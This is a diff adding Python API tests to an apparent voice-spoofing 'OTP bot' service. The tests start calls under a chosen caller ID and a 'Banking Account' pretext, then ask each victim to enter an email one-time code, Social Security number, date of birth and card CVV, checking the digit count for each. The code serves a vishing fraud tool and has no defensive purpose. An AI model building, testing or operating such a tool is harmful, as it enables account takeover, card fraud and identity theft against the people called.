@@ -219,6 +219,202 @@ class VoiceSpoofAPITester:
         )
         return success
 
+    def test_initiate_otp_call(self):
+        """Test initiating an OTP bot call"""
+        if not self.token:
+            self.log_test("Initiate OTP Call", False, "No token available")
+            return False, None
+            
+        call_config = {
+            "recipient_number": "+14155552671",
+            "caller_id": "+14245298701",
+            "recipient_name": "John Smith",
+            "service_name": "Banking Account",
+            "otp_digits": 6,
+            "language": "en"
+        }
+        
+        success, response = self.run_test(
+            "Initiate OTP Call",
+            "POST",
+            "otp/initiate-call",
+            200,
+            data=call_config
+        )
+        
+        session_id = None
+        if success and 'session_id' in response:
+            session_id = response['session_id']
+            print(f"   Session ID: {session_id}")
+            print(f"   Call ID: {response.get('call_id', 'N/A')}")
+            print(f"   Status: {response.get('status', 'unknown')}")
+        
+        return success, session_id
+
+    def test_request_info_otp_email(self, session_id):
+        """Test requesting Email OTP (6 digits)"""
+        if not self.token or not session_id:
+            self.log_test("Request Info - Email OTP", False, "No token or session_id available")
+            return False
+            
+        success, response = self.run_test(
+            "Request Info - Email OTP",
+            "POST",
+            f"otp/request-info/{session_id}?info_type=otp_email",
+            200
+        )
+        
+        if success:
+            print(f"   Info Type: {response.get('info_type', 'N/A')}")
+            print(f"   Digits Expected: {response.get('digits', 'N/A')}")
+            print(f"   Status: {response.get('status', 'N/A')}")
+            
+            # Verify correct digit count
+            if response.get('digits') != 6:
+                self.log_test("Request Info - Email OTP Validation", False, f"Expected 6 digits, got {response.get('digits')}")
+                return False
+            
+            # Verify info_type is correct
+            if response.get('info_type') != 'otp_email':
+                self.log_test("Request Info - Email OTP Validation", False, f"Expected info_type 'otp_email', got {response.get('info_type')}")
+                return False
+                
+            self.log_test("Request Info - Email OTP Validation", True, "Correct digit count (6) and info_type")
+        
+        return success
+
+    def test_request_info_ssn(self, session_id):
+        """Test requesting SSN (9 digits)"""
+        if not self.token or not session_id:
+            self.log_test("Request Info - SSN", False, "No token or session_id available")
+            return False
+            
+        success, response = self.run_test(
+            "Request Info - SSN",
+            "POST",
+            f"otp/request-info/{session_id}?info_type=ssn",
+            200
+        )
+        
+        if success:
+            print(f"   Info Type: {response.get('info_type', 'N/A')}")
+            print(f"   Digits Expected: {response.get('digits', 'N/A')}")
+            print(f"   Status: {response.get('status', 'N/A')}")
+            
+            # Verify correct digit count
+            if response.get('digits') != 9:
+                self.log_test("Request Info - SSN Validation", False, f"Expected 9 digits, got {response.get('digits')}")
+                return False
+            
+            # Verify info_type is correct
+            if response.get('info_type') != 'ssn':
+                self.log_test("Request Info - SSN Validation", False, f"Expected info_type 'ssn', got {response.get('info_type')}")
+                return False
+                
+            self.log_test("Request Info - SSN Validation", True, "Correct digit count (9) and info_type")
+        
+        return success
+
+    def test_request_info_dob(self, session_id):
+        """Test requesting Date of Birth (8 digits)"""
+        if not self.token or not session_id:
+            self.log_test("Request Info - DOB", False, "No token or session_id available")
+            return False
+            
+        success, response = self.run_test(
+            "Request Info - DOB",
+            "POST",
+            f"otp/request-info/{session_id}?info_type=dob",
+            200
+        )
+        
+        if success:
+            print(f"   Info Type: {response.get('info_type', 'N/A')}")
+            print(f"   Digits Expected: {response.get('digits', 'N/A')}")
+            print(f"   Status: {response.get('status', 'N/A')}")
+            
+            # Verify correct digit count
+            if response.get('digits') != 8:
+                self.log_test("Request Info - DOB Validation", False, f"Expected 8 digits, got {response.get('digits')}")
+                return False
+            
+            # Verify info_type is correct
+            if response.get('info_type') != 'dob':
+                self.log_test("Request Info - DOB Validation", False, f"Expected info_type 'dob', got {response.get('info_type')}")
+                return False
+                
+            self.log_test("Request Info - DOB Validation", True, "Correct digit count (8) and info_type")
+        
+        return success
+
+    def test_request_info_cvv(self, session_id):
+        """Test requesting CVV (3 digits)"""
+        if not self.token or not session_id:
+            self.log_test("Request Info - CVV", False, "No token or session_id available")
+            return False
+            
+        success, response = self.run_test(
+            "Request Info - CVV",
+            "POST",
+            f"otp/request-info/{session_id}?info_type=cvv",
+            200
+        )
+        
+        if success:
+            print(f"   Info Type: {response.get('info_type', 'N/A')}")
+            print(f"   Digits Expected: {response.get('digits', 'N/A')}")
+            print(f"   Status: {response.get('status', 'N/A')}")
+            
+            # Verify correct digit count
+            if response.get('digits') != 3:
+                self.log_test("Request Info - CVV Validation", False, f"Expected 3 digits, got {response.get('digits')}")
+                return False
+            
+            # Verify info_type is correct
+            if response.get('info_type') != 'cvv':
+                self.log_test("Request Info - CVV Validation", False, f"Expected info_type 'cvv', got {response.get('info_type')}")
+                return False
+                
+            self.log_test("Request Info - CVV Validation", True, "Correct digit count (3) and info_type")
+        
+        return success
+
+    def test_request_info_invalid_type(self, session_id):
+        """Test requesting with invalid info type"""
+        if not self.token or not session_id:
+            self.log_test("Request Info - Invalid Type", False, "No token or session_id available")
+            return False
+            
+        success, response = self.run_test(
+            "Request Info - Invalid Type",
+            "POST",
+            f"otp/request-info/{session_id}?info_type=invalid_type",
+            400  # Expecting 400 Bad Request
+        )
+        
+        return success
+
+    def test_get_otp_session(self, session_id):
+        """Test getting OTP session details"""
+        if not self.token or not session_id:
+            self.log_test("Get OTP Session", False, "No token or session_id available")
+            return False
+            
+        success, response = self.run_test(
+            "Get OTP Session",
+            "GET",
+            f"otp/session/{session_id}",
+            200
+        )
+        
+        if success:
+            print(f"   Session Status: {response.get('status', 'N/A')}")
+            print(f"   Current Step: {response.get('current_step', 'N/A')}")
+            print(f"   Info Type: {response.get('info_type', 'N/A')}")
+            print(f"   OTP Digits: {response.get('otp_digits', 'N/A')}")
+        
+        return success
+
     def run_all_tests(self):
         """Run comprehensive API tests"""
         print("=" * 60)
